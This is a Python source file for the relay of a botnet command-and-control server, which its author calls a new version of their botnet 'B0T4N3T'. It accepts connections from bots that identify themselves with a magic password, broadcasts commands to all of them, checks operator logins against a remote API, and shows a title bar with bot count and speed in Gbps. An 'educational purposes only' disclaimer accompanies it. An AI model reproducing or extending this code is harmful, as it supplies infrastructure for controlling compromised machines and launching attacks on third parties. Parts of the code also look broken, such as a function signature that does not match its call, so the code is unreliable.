#!/usr/bin/python3

from socket import socket as Sock
from socket import SOL_SOCKET, SO_KEEPALIVE, SO_REUSEADDR
import threading
from sys import exit, argv
from time import sleep, asctime, localtime
from colorama import Fore, init as colorama_init
import hashlib
from cryptography.fernet import Fernet
from requests import get as rget
from modules.config import RelayConfig
from modules.loops import Loops
from modules.relay import Relay


__filename__="relay"
__version__="3.0"
__legit__="I am in no way responsible for anything you do with it and I deny responsibility for any damage it may cause, my program is for educational purposes only, I do not endorse any other use."
__infos__="This is a 'new version' of my old botnet B0T4N3T"


config: RelayConfig = RelayConfig(True)


def log(
    data: str,
) -> None: 
    if config.debug: print(data)

def send(
    s: Sock,
    data: str,
    escape: bool = True,
    reset: bool = True,
) -> None:
    if reset: data += config.COLOR_RESET
    if escape: data += '\r\n'

    s.send(data.encode())

def broadcast(
    data: str,
) -> None:
    log(f"send {data}")

    for bot in config.bots.keys():
        try: send(bot, f'{data}', False, False)
        except Exception:
            config.bots.pop(bot)
            bot.close()

def find_login(
    username: str,
    password: str,
) -> bool:
    password: str = hashlib.sha256(password.encode()).hexdigest()

    url: str = f"{config.API_URL}/login.php?urlkey={config.URL_KEY}&usr={username}&pass={password}"
    log(f"\n\n{url}\n\n\n\n")
    res: str = rget(url, timeout=5000).json()

    return res == "ok"

def update_title(
    self,
    client: Sock,
    username: str,
):
    while 1:
        try:
            bot_number: int = sum(self.config.bots)
            relay_number: int = len(self.config.relay_list)
            total_speed: int = sum(self.config.speed)/125000
            actual_time: str = asctime(localtime())
            self.send(client, f'\33]0;{username}@PHYBOT C&C  |  Bots: {bot_number}  |  Relay: {relay_number}  |  Speed: {total_speed} Gbps  |  {actual_time}\a', False)

            sleep(self.config.cnc_time.UPTITLE)

        except Exception: client.close()



def handle_client(client, address):
    
    log("handleclient\n")
    
    while 1:
        send(client, config.ANSI_CLEAR, False)
        send(client, f'{config.COLOR_WHITE}Username > ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    password = ''
    while 1:
        send(client, config.ANSI_CLEAR, False)
        send(client, f'{config.COLOR_WHITE}Password > {Fore.BLACK} ', False, False)

        while not password.strip():
            password = client.recv(1024).decode('cp1252').strip()

        break
        
    if password != '\xff\xff\xff\xff\75':
        send(client, config.ANSI_CLEAR, False)

        if not find_login(username, password):
            send(client, f'{config.COLOR_RED}[{config.COLOR_WHITE}!{config.COLOR_RED}]{config.COLOR_RESET} Invalid credentials')
            sleep(1)
            client.close()
            return

        threading.Thread(target=update_title, args=(client, username)).start()

    else: config.bots.update({client: address})



def main():
    port: int = None

    if config.relay_addr.RELAY_PORT != None: port = config.relay_addr.RELAY_PORT

    else:
        if len(argv) != 2:
            log(f'Usage: python3 {argv[0]} <relay port>')
            exit()

        port = argv[1]
        if not port.isdigit() or int(port) < 1 or int(port) > 65535:
            log('Invalid relay port')
            exit()

    colorama_init(convert=True)

    s: Sock = Sock()
    s.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)

    try: s.bind(('0.0.0.0', port))

    except Exception:
        log('Failed to bind port')
        exit()

    s.listen()

    loop: Loops = Loops(config=config)
    relay: Relay = Relay(config=config)

    threading.Thread(target=loop.ping).start()
    threading.Thread(target=loop.net).start()
    threading.Thread(target=loop.genkey).start()
    threading.Thread(target=relay.relay).start()

    while 1:
        log("listen...\n")
        threading.Thread(target=handle_client, args=[*s.accept()]).start()

if __name__ == '__main__':
    print(f"\nLegit: {__legit__}\n")
    main()
